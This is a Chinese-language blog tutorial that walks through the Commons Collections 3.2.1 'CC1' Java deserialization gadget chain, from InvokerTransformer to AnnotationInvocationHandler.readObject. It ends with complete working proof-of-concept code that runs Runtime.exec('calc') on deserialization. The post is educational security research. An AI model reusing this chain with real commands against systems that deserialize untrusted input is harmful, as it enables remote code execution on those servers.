---
layout: post
title: Java反序列化CommonsCollections1(CC1)链分析
date: 2024-03-12 16:57:42
updated: 2024-03-12 16:57:42
tags:
  - Java安全
---

[Apache Commons ](http://commons.apache.org/)是 Apache 软件基金会的项目，`Commons` 的目的是提供可重用的、解决各种实际的通用问题且开源的 Java 代码。[Commons Collections](http://commons.apache.org/proper/commons-collections/) 包为 Java 标准的 `Collections API` 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。
<!-- more -->

### 环境配置

---

#### JDK版本

由于在 JDK8u71 这个版本中对一些漏洞进行了修复，所以使用老版本。

**这里下载时注意 URL 中不要有 cn；中文官网下载的 JDK 版本与显示的不一致。**

[JDK8u65](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)

下载完成后安装到本地，并导入到 IDEA 中：

文件 -> 项目结构；SDK -> 添加 JDK

![image-20240311104901011](http://pic.mewhz.com/blog/image-20240311104901011.png)

模块 -> 语言级别 -> 选择 8

![image-20240311105015757](http://pic.mewhz.com/blog/image-20240311105015757.png)

#### 依赖包源代码

在 pom.xml 中添加 cc1 链的依赖包

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

正常使用 maven 下载，只是导入 .class 文件；.class 文件在 IDEA 中查看是反编译的代码，阅读起来会很困难，而且在代码中右键使用**查找用法**功能时，无法对 .class 文件进行查找，所以要下载源代码。

在侧栏的 Maven 选项中右键下载源代码。

![image-20240311110734410](http://pic.mewhz.com/blog/image-20240311110734410.png)

#### sun 包源代码

同理 Java 源代码中 sun 包下的代码均为 .class 文件；

下载对应版本的 OpenJDK：https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4

来到官网搜索需要的类`AnnotationInvocationHandler`：https://hg.openjdk.org/jdk8u/jdk8u/jdk

选择第一个链接；并找到他的上一个版本，下载源码。

![image-20240311144800117](http://pic.mewhz.com/blog/image-20240311144800117.png)

![image-20240311144923524](http://pic.mewhz.com/blog/image-20240311144923524.png)

![image-20240311144943497](http://pic.mewhz.com/blog/image-20240311144943497.png)

下载并解压后，来到 Java 的安装目录解压根目录的 src.zip；

在 OpenJDK 中复制 src -> share -> classes 的 sun 包到 Java 安装目录的 src 下：

![image-20240311154741051](http://pic.mewhz.com/blog/image-20240311154741051.png)

在 IDEA 中导入源代码：

文件 -> 项目结构；SDK -> 源路径 -> ➕ -> 选择 Java 根目录的 src 文件夹

![image-20240311154847653](http://pic.mewhz.com/blog/image-20240311154847653.png)

### CC1 攻击链分析

---

根据 CC1 的特点来到 `Transformer` 接口；

![image-20240311160344309](http://pic.mewhz.com/blog/image-20240311160344309.png)

逐一查找它们的 `transform` 方法，最终确认 `InvokerTransformer` 类中的 `transform` 方法存在反射调用任意类的情况，也就是该链的尾部：命令执行。

![image-20240311160707664](http://pic.mewhz.com/blog/image-20240311160707664.png)

简单的反射调用弹出计算器，成功弹出；

```java
package com.mewhz.cc1;

import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws Exception {

        Runtime runtime = Runtime.getRuntime();
        // 获取 Runtime 对象
        Class clazz = Runtime.class;
        // 获取 Runtime 类
        Method exec = clazz.getMethod("exec", String.class);
        // 获取 exec 方法
        exec.invoke(runtime, "calc");
        // 执行 exec 方法
        // exec 属于普通方法，所以 invoke 第一个参数是类对象
    }
}
```

测试使用 `InvokerTransformer` 类的 `transformer` 方法能否弹出计算器，成功弹出；

```java
package com.mewhz.cc1;

import org.apache.commons.collections.functors.InvokerTransformer;

public class Main {
    public static void main(String[] args) throws Exception {

        Runtime runtime = Runtime.getRuntime();
        // 获取 Runtime 对象

        new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"calc"}
        ).transform(runtime);
        /*
            构造方法接收三个参数
            1. 执行的方法名，字符串类型
            2. 执行的方法参数类型，类数组
            3. 执行的方法参数值，bject 数组
            transform 方法可以执行传递的对象的某个方法
         */
    }
}
```

找到链子的尾部，接下来继续寻找哪个方法调用了`InvokerTransformer` 类的 `transformer` 方法。

在 `transformer` 方法名，右键 -> 查找用法；

![image-20240311165828057](http://pic.mewhz.com/blog/image-20240311165828057.png)

寻找的过程中，主要看方法名不是 `transformer` 的调用，这样才能够形成一条完整的利用链，最后的目的是找到反序列化漏洞的入口：`readObject` 方法。

找到了 `TransformedMap` 类的 `checkSetValue` 方法调用了 `transformer`：

```java
// TransformedMap
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

查看 `TransformedMap` 的构造方法，相当于传递两个 Transformer，分别对参数中 Map 的 key 和 value 进行操作：

```java
// TransformedMap
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
```

使用 `protected` 修饰的方法只能通过：同一个类、同一个包或不同包的子类访问；于是找到 `decorate` 方法，该方法在内部 `new TransformedMap()`：

```java
// TransformedMap
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

继续**查找用法**寻找调用 `checkSetValue` 的方法；

![image-20240311224744536](http://pic.mewhz.com/blog/image-20240311224744536.png)

发现 `AbstractInputCheckedMapDecorator` 类的内部类 `MapEntry` 的 `setValue` 方法调用了 `checkSetValue`；而 `AbstractInputCheckedMapDecorator` 又是 `TransformedMap` 的父类：

```java
// AbstractInputCheckedMapDecorator
static class MapEntry extends AbstractMapEntryDecorator {

    /** The parent map */
    private final AbstractInputCheckedMapDecorator parent;

    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
        super(entry);
        this.parent = parent;
    }

    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
}
```

继续查找 `setValue` 通过哪些方法调用，选择 `setValue` 方法侧面的红色小箭头可以来到 `AbstractMapEntryDecorator` 类中的 `setValue` 方法；

![image-20240311225602863](http://pic.mewhz.com/blog/image-20240311225602863.png)

同理再一次选择红色小箭头可以来到 `Map` 的 `setValue` 方法。

![image-20240311225616322](http://pic.mewhz.com/blog/image-20240311225616322.png)

![image-20240311225707077](http://pic.mewhz.com/blog/image-20240311225707077.png)

所以该方法实际上是给 Map 中的一组键值对(**Entry**)进行 `setValue` 操作。

测试一系列过程能否正常弹出计算器：弹出成功。

1. 创建 `Runtime` 对象，在后续传递中需要，因为 `invoke` 方法的第一个参数是方法运行的实例对象；

2. 创建 `InvokerTransformer` 对象，并通过构造方法赋值，三个参数分别为：
   1. 执行的方法名：字符串类型；
   2. 执行的方法参数类型：类数组；
   3. 执行的方法参数值：Object 数组；
3. 创建 `Map` 后续修饰需要用到，并赋值以便使用 `foreach` 遍历；
4. 修饰 `Map` 通过构造方法给 value 加上 `invokerTransformer` 方法，因为后续调用 `setValue` 所以 key 可设置为 null；
5. 遍历每个键值对，修改其中的值为 `Runtime` 对象。

```java
package com.mewhz.cc1;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {

        Runtime runtime = Runtime.getRuntime();
        // 获取 Runtime 对象

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        // 创建 InvokerTransformer 作为要使用的类

        HashMap<Object, Object> map = new HashMap();
        // 创建 Map 作为要使用的类

        map.put("key", "value");
        // 赋值 方便后续遍历

        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
        // 修饰 map，把它 value 加上 invokerTransformer 方法

        for (Map.Entry entry : transformedMap.entrySet()) {
            // 使用 foreach 获取 map 中每个键值对 (entry)
            entry.setValue(runtime);
            // 赋值，由于赋值时会把 value 的值传递给 checkSetValue 方法
            // 于是传递 runtime 以便后续 invoke
        }

    }
}
```

继续通过**查找用法**寻找哪个方法调用 `setValue` 方法，最终在 `AnnotationInvocationHandler` 类的 `readObject` 方法中找到了调用 `setValue` 的地方，也就是链首。 

```java
// AnnotationInvocationHandler
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                        annotationType.members().get(name)));
            }
        }
    }
}
```

寻找该类中可控制的变量，根据构造方法得到 `memberValues` 也就是 `Map` 类可控：

```java
// AnnotationInvocationHandler
AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
    Class<?>[] superInterfaces = type.getInterfaces();
    if (!type.isAnnotation() ||
        superInterfaces.length != 1 ||
        superInterfaces[0] != java.lang.annotation.Annotation.class)
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    this.type = type;
    this.memberValues = memberValues;
}
```

由于构造方法没有写修饰符，所以是默认类型；默认类型只能在同一个类或同一个包下才可以访问到。

使用反射获取 `AnnotationInvocationHandler`，但是执行序列化和反序列化操作并没有弹出计算器；

```java
package com.mewhz.cc1;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {

        Runtime runtime = Runtime.getRuntime();
        // 获取 Runtime 对象

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        // 创建 InvokerTransformer 作为要使用的类

        HashMap<Object, Object> map = new HashMap();
        // 创建 Map 作为要使用的类

        map.put("key", "value");
        // 赋值 方便后续遍历

        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
        // 修饰 map，把它 value 加上 invokerTransformer 方法

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 根据包名反射获取类对象
        Constructor annotationInvocationHandlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 由于构造方法是默认类型，所以使用 getDeclared 获取构造方法
        // 参数分别是 Class 和 Map 类型
        annotationInvocationHandlerConstructor.setAccessible(true);
        // 修改可见性
        Object object = annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);
        // 传递构造方法的参数，两个参数分别为
        // 1. 注解的类对象
        // 2. Map

        serialize(object);
        unSerialize("ser.bin");

    }

    public static void serialize(Object object) throws Exception {
        // 序列化对象
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    public static Object unSerialize(String fileName) throws Exception {
        // 反序列化对象
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
```

因为不符合 `AnnotationInvocationHandler` 中 `readObject` 的两个 if 方法，导致 `setValue` 没有执行；

debug 调试发现 `memberType` 的值是 null，所以没有进入 if 语句；

![image-20240312112719887](http://pic.mewhz.com/blog/image-20240312112719887.png)

分析源码：

```java
annotationType = AnnotationType.getInstance(type);
// 获取 type 的实例对象，也就是传入的注解类的实例对象
Map<String, Class<?>> memberTypes = annotationType.memberTypes();
// 获取该实例对象的所有成员
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    // 获取传入 map 对象的所有键值对
    String name = memberValue.getKey();
    // 获取其中的 key
    Class<?> memberType = memberTypes.get(name);
    // 根据获取的 key 在注解类的实例对象中所有成员寻找 value
}
// 根据传递的参数 Override.class 和 transformedMap
// Override 中并没有成员变量和方法，所以 if 无法执行
```

`Target` 中存在 `value` 成员，修改传递参数为 `Target.class`，同时修改 `map.put("value", "value")`；

```java
map.put("value", "value");
Object object = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
```

此时可以满足两个 if ，但 `setValue` 的值固定是 `new AnnotationTypeMismatchExceptionProxy`；

![image-20240312114846306](http://pic.mewhz.com/blog/image-20240312114846306.png)

不过 `setValue` -> `checkSetValue` 中会调用 `valueTransformer.transform()`；

配合 `ChainedTransformer` 和 `ConstantTransformer` 类即可，`ChainedTransformer` 的作用是把内部多个 `Transformer` 的 `transformer` 方法串在一起，也就是前一个方法的结果会作为后一个方法的参数传入；

```java
// ChainedTransformer
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

而 `ConstantTransformer` 的 `transformer` 会把构造方法中的参数原样返回；利用 `ConstantTransformer` 过滤掉一开始的类，把自定义的类传入 `InvokerTransformer`。

```java
// ConstantTransformer
public Object transform(Object input) {
    return iConstant;
}
```

修改代码如下：

```java
package com.mewhz.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class TestDemo {

    @Test
    public void test1() throws Exception {
        Runtime runtime = Runtime.getRuntime();
        // 创建 Runtime 的实例对象
        ConstantTransformer constantTransformer = new ConstantTransformer(runtime);
        // constantTransformer 会把 runtime 的实例对象原样返回；用于过滤一开始 setValue 的类
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        // invokerTransformer 用于执行方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                constantTransformer,
                invokerTransformer
        });
        // 把两个 transformer 组合起来
        // 首先通过 constantTransformer 过滤掉内部类
        // 在把返回的 runtime 实例对象作为参数传递给 invokerTransformer
        // 执行 runtime.exec("calc");

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        // 为了和 Target 注解的成员一致 key 赋值为 value
        Map<Object, Object> transformerMap = TransformedMap.decorate(map, null, chainedTransformer);
        // 修饰 Map，把它的 value 加上 chainedTransformer
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 根据反射获取类对象
        Constructor annotationInvocationHandlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 由于构造方法是默认类型，所以使用 getDeclared 获取构造方法
        // 参数分别是 Class 和 Map 类型
        annotationInvocationHandlerConstructor.setAccessible(true);
        // 修改构造方法的可见性
        Object object = annotationInvocationHandlerConstructor.newInstance(Target.class, transformerMap);
        // 传递构造方法的参数，两个参数分别为
        // 1. 注解的类对象
        // 2. Map

        serialize(object);
        unSerialize("ser.bin");
    }

    public static void serialize(Object object) throws Exception {
        // 序列化对象
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    public static Object unSerialize(String fileName) throws Exception {
        // 反序列化对象
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
```

涉及到的类中`Runtime` 没有实现 `java.io.Serializable` 接口；

![image-20240312100339494](http://pic.mewhz.com/blog/image-20240312100339494.png)

 但是它的 `Class`可以序列化，`Class` 实现了 `java.io.Serializable` 接口

![image-20240312151438524](http://pic.mewhz.com/blog/image-20240312151438524.png)

使用普通反射获取 `Runtime` 实例对象并弹出计算器；

```java
@Test
public void test2() throws Exception {
    Class clazz = Runtime.class;
    // 获取 Runtime 的类对象
    Method getRuntime = clazz.getMethod("getRuntime");
    // 获取 getRuntime 方法
    Runtime runtime = (Runtime) getRuntime.invoke(null);
    // 执行静态方法获取 runtime 实例对象，静态方法时第一个参数可为 null
    Method execMethod = clazz.getMethod("exec", String.class);
    // 获取 exec 方法
    execMethod.invoke(runtime, "calc");
    // 执行 calc
}
```

改写成 `InvokerTransformer` 的形式，在 `transformer` 内部配合 `ChainedTransformer` 类反射 `Runtime` 的实例对象。

```java
package com.mewhz.cc1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class TestDemo {

    @Test
    public void test1() throws Exception {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                // constantTransformer 会把 runtime 的实例对象原样返回；用于过滤一开始 setValue 的类
                // 同时相当于 Class clazz = Runtime.class;
                // 传递 clazz 参数给下一个 transformer
                new InvokerTransformer(
                  "getMethod",
                  new Class[]{String.class, Class[].class},
                  new Object[]{"getRuntime", null}
                ),
                /*
                    由于 ChainedTransformer 的循环传入一个 Runtime.class
                    相当于执行 clazz.getMethod("getRuntime");
                    new InvokerTransformer 构造方法的三个参数
                    1. 执行的方法名，字符串类型
                        getMethod
                    2. 执行的方法参数类型，类数组
                        getMethod 接收的类型是字符串和可变长 Class，也就是 Class 数组
                    3. 执行的方法参数值，Object 数组：
                        getRuntime 和 null
                    transform 方法可以执行传递的对象的某个方法
                    由于 ChainedTransformer 的循环返回一个 Method 的实例对象
                 */
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}
                ),
                /*
                    由于 ChainedTransformer 的循环传入一个 Method 的实例对象
                    相当于执行 getRuntime.invoke(null);
                    new InvokerTransformer 构造方法的三个参数
                    1. 执行的方法名，字符串类型
                        invoke
                    2. 执行的方法参数类型，类数组
                        invoke 接收的类型是 Object 类和可变长 Object 类，也就是 Object 数组
                    3. 执行的方法参数值，Object 数组：
                        null 和 null
                    transform 方法可以执行传递的对象的某个方法
                    由于 ChainedTransformer 的循环返回一个 Runtime 的实例对象
                 */
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
                /*
                    由于 ChainedTransformer 的循环传入一个 Runtime 的实例对象
                    相当于执行 runtime.exec("calc");
                    new InvokerTransformer 构造方法的三个参数
                    1. 执行的方法名，字符串类型
                        invoke
                    2. 执行的方法参数类型，类数组
                        invoke 接收的类型是 Object 类和可变长 Object 类，也就是 Object 数组
                    3. 执行的方法参数值，Object 数组：
                        null 和 null
                    transform 方法可以执行传递的对象的某个方法
                 */
        });
        // 把两个 transformer 组合起来
        // 首先通过 constantTransformer 过滤掉内部类
        // 在把返回的 runtime 实例对象作为参数传递给 invokerTransformer
        // 执行 runtime.exec("calc");

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        // 为了和 Target 注解的成员一致 key 赋值为 value
        Map<Object, Object> transformerMap = TransformedMap.decorate(map, null, chainedTransformer);
        // 修饰 Map，把它的 value 加上 chainedTransformer
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 根据反射获取类对象
        Constructor annotationInvocationHandlerConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        // 由于构造方法是默认类型，所以使用 getDeclared 获取构造方法
        // 参数分别是 Class 和 Map 类型
        annotationInvocationHandlerConstructor.setAccessible(true);
        // 修改构造方法的可见性
        Object object = annotationInvocationHandlerConstructor.newInstance(Target.class, transformerMap);
        // 传递构造方法的参数，两个参数分别为
        // 1. 注解的类对象
        // 2. Map

        serialize(object);
        unSerialize("ser.bin");
    }

    public static void serialize(Object object) throws Exception {
        // 序列化对象
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(object);
    }

    public static Object unSerialize(String fileName) throws Exception {
        // 反序列化对象
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
```

成功弹出计算器~

![image-20240312161318823](http://pic.mewhz.com/blog/image-20240312161318823.png)

**利用链**

>1. AnnotationInvocationHandler -> readObject();
>2. AbstractInputCheckedMapDecorator -> setValue();
>3. TransformedMap -> checkSetValue();
>4. InvokerTransformer -> transform();
>5. transform() -> invoke();

### 参考资料

[Java反序列化CommonsCollections篇(一) CC1链手写EXP](https://www.bilibili.com/video/BV1no4y1U7E1)

[Java反序列化Commons-Collections篇01-CC1链](https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/)

[Apache Commons Collections包和简介](https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/)